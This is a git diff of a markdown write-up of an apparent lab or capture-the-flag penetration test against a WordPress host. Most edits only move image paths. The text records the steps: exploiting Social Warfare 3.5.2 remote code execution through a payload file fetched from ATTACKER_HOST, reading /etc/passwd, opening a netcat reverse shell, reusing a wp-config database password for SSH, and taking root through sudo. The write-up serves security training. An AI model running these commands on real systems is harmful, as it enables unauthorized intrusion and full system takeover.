@@ -18,12 +18,11 @@ IP: 192.168.127.123
 - Found mysql was listening on localhost
 - Found wordpress config file with users password 
 - Logged into SSH session with found username and password
-- 
-- Text
+- Found user can run sudo for any command 
+- Typed sudo root and received a root shell
 
 ## Improved skills
 - Found password credentials for SSH in wordpress config file
-- skill 2
 
 ## Used tools
 - nmap
@@ -143,20 +142,20 @@ Enumerated top 200 UDP ports:
 
 #### -Ran Gobuster and found "/wordpress" directory and the following wordpress site webpage. Navigated the webpage and found the below login page:
 
-![](Pasted%20image%2020221018221158.png)
+![](Images/Pasted%20image%2020221018221158.png)
 
-![](Pasted%20image%2020221018221533.png)
+![](Images/Pasted%20image%2020221018221533.png)
 
-![](Pasted%20image%2020221018221609.png)
+![](Images/Pasted%20image%2020221018221609.png)
 
 
 #### -Ran WPScan and found the following showing plugin "social-warfare version 3.5.2": 
 
-![](Pasted%20image%2020221018221708.png)
+![](Images/Pasted%20image%2020221018221708.png)
 
 #### -Googled "social-warfare 3.5.2 exploit" and found the following ling and navigate to the web page and followed the steps: 
-![](Pasted%20image%2020221018221940.png)
-![](Pasted%20image%2020221018221808.png)
+![](Images/Pasted%20image%2020221018221940.png)
+![](Images/Pasted%20image%2020221018221808.png)
 #Social-warfare3.5.2unauthenticatedRCE 
 
 #### -Made a payload.txt file with the script "<pre>system('cat /etc/passwd')</pre>" inside
@@ -165,9 +164,9 @@ Enumerated top 200 UDP ports:
 
 #### -Input http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt instead of listed http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt as shown in the wpscan exploit showing previously as the previous weblogin page started with "/wordpress/" directory shown below and received the following webpage finding the user "takis":  
 
-![](Pasted%20image%2020221018222059.png)
+![](Images/Pasted%20image%2020221018222059.png)
 
-![](Pasted%20image%2020221018222141.png)
+![](Images/Pasted%20image%2020221018222141.png)
 
 ---
 
@@ -177,9 +176,9 @@ Enumerated top 200 UDP ports:
 
 #### -Typed vim payload.txt and changed the cat etc/passwd script with "<pre>system('nc -e /bin/bash 192.168.49.213 5002')</pre>" and ran penelope listener and received reverse shell: 
 
-![](Pasted%20image%2020221018222630.png)
+![](Images/Pasted%20image%2020221018222630.png)
 
-![](Pasted%20image%2020221018222721.png)
+![](Images/Pasted%20image%2020221018222721.png)
 
 ---
 
@@ -188,9 +187,9 @@ Enumerated top 200 UDP ports:
 
 #### -Uploaded and ran linux-smart-enumeration script "lse.sh" and found services  listening on localhost. Typed "ss –nltp" to show all running services/processes running on all ports:
 
-![](Pasted%20image%2020221018223433.png)
+![](Images/Pasted%20image%2020221018223433.png)
 
-![](Pasted%20image%2020221018223516.png)
+![](Images/Pasted%20image%2020221018223516.png)
 
 
 ## Lateral Movement vector
@@ -220,12 +219,12 @@ define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );
 
 define( 'DB_HOST', 'localhost' ); 
 
-![](Pasted%20image%2020221018224046.png)
+![](Images/Pasted%20image%2020221018224046.png)
 #wp-configFile
 
 #### -Typed "ssh takis@localhost" then input the password "R3&]vzhHmMn9,:-5" found earlier in the config file and received a ssh session for user "takis" below: 
 
-![](Pasted%20image%2020221018224246.png)
+![](Images/Pasted%20image%2020221018224246.png)
 ---
 
 
@@ -240,7 +239,7 @@ define( 'DB_HOST', 'localhost' );
 
 #### Typed "sudo su root" and received a root shell and found root flag in "proof.txt" file: 
 
-![](Pasted%20image%2020221018224509.png)
+![](Images/Pasted%20image%2020221018224509.png)
 
 ---
 
